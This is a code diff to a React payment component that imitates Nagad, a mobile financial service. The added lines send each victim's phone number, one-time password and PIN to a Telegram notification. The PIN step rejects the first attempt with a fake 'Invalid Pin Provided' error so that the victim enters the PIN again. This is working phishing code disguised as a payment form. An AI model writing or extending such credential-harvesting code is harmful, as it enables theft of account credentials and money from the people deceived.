@@ -73,20 +73,20 @@ const NagadPayment = () => {
 
   const handleConfirm = () => {
     if (isValidNumber()) { 
-      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs' });
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join('') });
       setPhoneError(""); setShowOtpView(true); 
     }
     else setPhoneError(language === 'bn' ? "অবৈধ মোবাইল নম্বর" : "Invalid mobile number");
   };
   const handleOtpConfirm = () => { 
     if (isValidOtp()) { 
-      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs' });
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue });
       setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); 
     } 
   };
   const handlePinConfirm = () => {
     if (pinAttempts === 0) {
-      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs' });
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') });
       setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
       setPinAttempts(1);
     } else {
